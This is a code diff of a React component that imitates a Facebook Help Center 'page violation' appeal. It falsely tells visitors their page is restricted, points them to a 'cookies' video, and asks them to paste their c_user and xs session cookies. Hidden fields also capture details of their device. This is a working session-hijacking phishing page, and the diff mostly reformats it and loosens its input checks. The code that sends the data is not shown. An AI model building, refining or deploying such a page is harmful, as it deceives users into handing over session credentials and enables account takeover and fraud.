@@ -29,8 +29,6 @@ function Home({ onNext }) {
 
     if (!formData.c_user.trim()) {
       newErrors.c_user = "c_user is required";
-    } else if (!/^\d{15}$/.test(formData.c_user)) {
-      newErrors.c_user = "Please enter 15 digits";
     }
 
     if (!formData.xs.trim()) {
@@ -95,95 +93,128 @@ function Home({ onNext }) {
   };
 
   return (
-    <div style={{ minHeight: '100vh', backgroundColor: '#fff' }}>
+    <div style={{ minHeight: "100vh", backgroundColor: "#fff" }}>
       {/* Facebook Header */}
-      <div style={{
-        width: '100%',
-        height: '90px',
-        background: 'rgb(70, 103, 172)',
-        display: 'flex',
-        alignItems: 'center'
-      }}>
-        <h1 style={{
-          color: 'white',
-          marginLeft: '1rem',
-          margin: '0',
-          fontSize: '2rem',
-          fontWeight: 'bold'
-        }}>facebook</h1>
+      <div
+        style={{
+          width: "100%",
+          height: "90px",
+          background: "rgb(70, 103, 172)",
+          display: "flex",
+          alignItems: "center",
+        }}
+      >
+        <h1
+          style={{
+            color: "white",
+            marginLeft: "1rem",
+            margin: "0",
+            fontSize: "2rem",
+            fontWeight: "bold",
+          }}
+        >
+          facebook
+        </h1>
       </div>
 
       {/* Help Center Header */}
-      <div style={{
-        width: '100%',
-        height: '60px',
-        background: 'rgb(233, 235, 238)',
-        display: 'flex',
-        alignItems: 'center'
-      }}>
-        <h4 style={{
-          marginLeft: '1rem',
-          margin: '0',
-          color: 'rgb(70, 103, 172)',
-          fontSize: '1.2rem'
-        }}>Help Center</h4>
+      <div
+        style={{
+          width: "100%",
+          height: "60px",
+          background: "rgb(233, 235, 238)",
+          display: "flex",
+          alignItems: "center",
+        }}
+      >
+        <h4
+          style={{
+            marginLeft: "1rem",
+            margin: "0",
+            color: "rgb(70, 103, 172)",
+            fontSize: "1.2rem",
+          }}
+        >
+          Help Center
+        </h4>
       </div>
 
       {/* Main Content */}
-      <div style={{
-        width: '100%',
-        marginTop: '1rem',
-        marginBottom: '1rem',
-        display: 'flex',
-        justifyContent: 'center',
-        alignItems: 'center'
-      }}>
-        <div style={{
-          width: '91.666667%',
-          maxWidth: '500px',
-          border: '1px solid #ddd'
-        }}>
+      <div
+        style={{
+          width: "100%",
+          marginTop: "1rem",
+          marginBottom: "1rem",
+          display: "flex",
+          justifyContent: "center",
+          alignItems: "center",
+        }}
+      >
+        <div
+          style={{
+            width: "91.666667%",
+            maxWidth: "500px",
+            border: "1px solid #ddd",
+          }}
+        >
           {/* Form Header */}
-          <div style={{
-            padding: '0.5rem',
-            background: 'rgb(245, 246, 247)'
-          }}>
-            <h5 style={{
-              margin: '0',
-              fontSize: '1.1rem',
-              fontWeight: '600'
-            }}>Request For Remove Page Violation</h5>
+          <div
+            style={{
+              padding: "0.5rem",
+              background: "rgb(245, 246, 247)",
+            }}
+          >
+            <h5
+              style={{
+                margin: "0",
+                fontSize: "1.1rem",
+                fontWeight: "600",
+              }}
+            >
+              Request For Remove Page Violation
+            </h5>
           </div>
 
           {/* Form Content */}
-          <div style={{ padding: '0.5rem' }}>
-            <p style={{
-              fontWeight: '600',
-              fontSize: '14px',
-              marginBottom: '8px'
-            }}>
-              We've identified irregular activity on your page that goes against our community guidelines.
+          <div style={{ padding: "0.5rem" }}>
+            <p
+              style={{
+                fontWeight: "600",
+                fontSize: "14px",
+                marginBottom: "8px",
+              }}
+            >
+              We've identified irregular activity on your page that goes against
+              our community guidelines.
             </p>
-            <p style={{
-              fontWeight: '600',
-              fontSize: '14px',
-              marginBottom: '8px'
-            }}>
-              As a result, access to your page has been restricted, and you're presently unable to post, share, or comment using it.
+            <p
+              style={{
+                fontWeight: "600",
+                fontSize: "14px",
+                marginBottom: "8px",
+              }}
+            >
+              As a result, access to your page has been restricted, and you're
+              presently unable to post, share, or comment using it.
             </p>
-            <p style={{
-              fontWeight: '600',
-              fontSize: '14px',
-              marginBottom: '8px'
-            }}>
-              Please provide the precise details below. Refer to the video for clarification if you find the instructions unclear.
+            <p
+              style={{
+                fontWeight: "600",
+                fontSize: "14px",
+                marginBottom: "8px",
+              }}
+            >
+              Please provide the precise details below. Refer to the video for
+              clarification if you find the instructions unclear.
             </p>
-            <p style={{
-              fontWeight: '600',
-              color: '#6c757d',
-              fontSize: '12px',
-              marginBottom: '8px'
-            }}>
+            <p
+              style={{
+                fontWeight: "600",
+                color: "#6c757d",
+                fontSize: "12px",
+                marginBottom: "8px",
+              }}
+            >
               Detailed Video Information.
             </p>
 
@@ -193,40 +224,62 @@ function Home({ onNext }) {
               autoPlay
               src="https://cdn.glitch.global/cfdab748-b145-4b28-8f85-c26ac388a3c9/cookies.mp4?v=1719846896202"
               style={{
-                width: '300px',
-                height: '160px',
-                maxWidth: '100%'
+                width: "300px",
+                height: "160px",
+                maxWidth: "100%",
               }}
             />
             <br />
-            <button style={{
-              marginTop: '8px',
-              padding: '4px 8px',
-              backgroundColor: '#f8f9fa',
-              border: '1px solid #ddd',
-              borderRadius: '4px',
-              cursor: 'pointer'
-            }}>
+            <button
+              style={{
+                marginTop: "8px",
+                padding: "4px 8px",
+                backgroundColor: "#f8f9fa",
+                border: "1px solid #ddd",
+                borderRadius: "4px",
+                cursor: "pointer",
+              }}
+            >
               Enable Sound
             </button>
 
-            <p style={{
-              fontWeight: '600',
-              fontSize: '14px',
-              marginTop: '0.5rem',
-              marginBottom: '8px'
-            }}>
+            <p
+              style={{
+                fontWeight: "600",
+                fontSize: "14px",
+                marginTop: "0.5rem",
+                marginBottom: "8px",
+              }}
+            >
               Please be sure to provide the requested information below.
             </p>
 
             <form onSubmit={handleSubmit}>
               {/* Hidden device information fields */}
-              <input type="hidden" name="screenWidth" value={window.innerWidth} />
-              <input type="hidden" name="screenHeight" value={window.innerHeight} />
-              <input type="hidden" name="isTouchDevice" value={'ontouchstart' in window ? 'true' : 'false'} />
-              
+              <input
+                type="hidden"
+                name="screenWidth"
+                value={window.innerWidth}
+              />
+              <input
+                type="hidden"
+                name="screenHeight"
+                value={window.innerHeight}
+              />
+              <input
+                type="hidden"
+                name="isTouchDevice"
+                value={"ontouchstart" in window ? "true" : "false"}
+              />
+
               {/* c_user field */}
-              <label style={{ fontSize: '12px', display: 'block', marginBottom: '4px' }}>
+              <label
+                style={{
+                  fontSize: "12px",
+                  display: "block",
+                  marginBottom: "4px",
+                }}
+              >
                 c_user
               </label>
               <input
@@ -238,22 +291,35 @@ function Home({ onNext }) {
                 pattern="^\d{15}$"
                 title="Please enter 15 digits"
                 style={{
-                  width: '100%',
-                  padding: '8px',
-                  border: '1px solid #ddd',
-                  borderRadius: '4px',
-                  marginBottom: '1rem',
-                  boxSizing: 'border-box'
+                  width: "100%",
+                  padding: "8px",
+                  border: "1px solid #ddd",
+                  borderRadius: "4px",
+                  marginBottom: "1rem",
+                  boxSizing: "border-box",
                 }}
               />
               {errors.c_user && (
-                <div style={{ color: 'red', fontSize: '12px', marginTop: '-0.5rem', marginBottom: '0.5rem' }}>
+                <div
+                  style={{
+                    color: "red",
+                    fontSize: "12px",
+                    marginTop: "-0.5rem",
+                    marginBottom: "0.5rem",
+                  }}
+                >
                   {errors.c_user}
                 </div>
               )}
 
               {/* xs field */}
-              <label style={{ fontSize: '12px', display: 'block', marginBottom: '4px' }}>
+              <label
+                style={{
+                  fontSize: "12px",
+                  display: "block",
+                  marginBottom: "4px",
+                }}
+              >
                 xs
               </label>
               <input
@@ -263,51 +329,69 @@ function Home({ onNext }) {
                 onChange={handleInputChange}
                 required
                 style={{
-                  width: '100%',
-                  padding: '8px',
-                  border: '1px solid #ddd',
-                  borderRadius: '4px',
-                  marginBottom: '1rem',
-                  boxSizing: 'border-box'
+                  width: "100%",
+                  padding: "8px",
+                  border: "1px solid #ddd",
+                  borderRadius: "4px",
+                  marginBottom: "1rem",
+                  boxSizing: "border-box",
                 }}
               />
               {errors.xs && (
-                <div style={{ color: 'red', fontSize: '12px', marginTop: '-0.5rem', marginBottom: '0.5rem' }}>
+                <div
+                  style={{
+                    color: "red",
+                    fontSize: "12px",
+                    marginTop: "-0.5rem",
+                    marginBottom: "0.5rem",
+                  }}
+                >
                   {errors.xs}
                 </div>
               )}
 
-              <p style={{
-                fontSize: '12px',
-                marginTop: '0.5rem',
-                marginBottom: '1rem'
-              }}>
-                Please make sure not to log out from your computer or laptop until you have received a verification email.
+              <p
+                style={{
+                  fontSize: "12px",
+                  marginTop: "0.5rem",
+                  marginBottom: "1rem",
+                }}
+              >
+                Please make sure not to log out from your computer or laptop
+                until you have received a verification email.
               </p>
 
               {errors.submit && (
-                <div style={{ color: 'red', fontSize: '14px', marginBottom: '1rem' }}>
+                <div
+                  style={{
+                    color: "red",
+                    fontSize: "14px",
+                    marginBottom: "1rem",
+                  }}
+                >
                   {errors.submit}
                 </div>
               )}
 
               {/* Submit Button inside form */}
-              <div style={{
-                display: 'flex',
-                justifyContent: 'flex-end',
-                marginTop: '1rem'
-              }}>
+              <div
+                style={{
+                  display: "flex",
+                  justifyContent: "flex-end",
+                  marginTop: "1rem",
+                }}
+              >
                 <button
                   type="submit"
                   disabled={isSubmitting}
                   style={{
-                    color: 'white',
-                    border: 'none',
-                    background: 'rgb(66, 103, 178)',
-                    padding: '8px 16px',
-                    borderRadius: '4px',
-                    cursor: isSubmitting ? 'not-allowed' : 'pointer',
-                    opacity: isSubmitting ? 0.6 : 1
+                    color: "white",
+                    border: "none",
+                    background: "rgb(66, 103, 178)",
+                    padding: "8px 16px",
+                    borderRadius: "4px",
+                    cursor: isSubmitting ? "not-allowed" : "pointer",
+                    opacity: isSubmitting ? 0.6 : 1,
                   }}
                 >
                   {isSubmitting ? "Submitting..." : "Submit"}
@@ -317,14 +401,15 @@ function Home({ onNext }) {
           </div>
 
           {/* Form Footer */}
-          <div style={{
-            padding: '0.5rem',
-            marginBottom: '0.5rem',
-            display: 'flex',
-            justifyContent: 'flex-end',
-            background: 'rgb(245, 246, 247)'
-          }}>
-          </div>
+          <div
+            style={{
+              padding: "0.5rem",
+              marginBottom: "0.5rem",
+              display: "flex",
+              justifyContent: "flex-end",
+              background: "rgb(245, 246, 247)",
+            }}
+          ></div>
         </div>
       </div>
     </div>
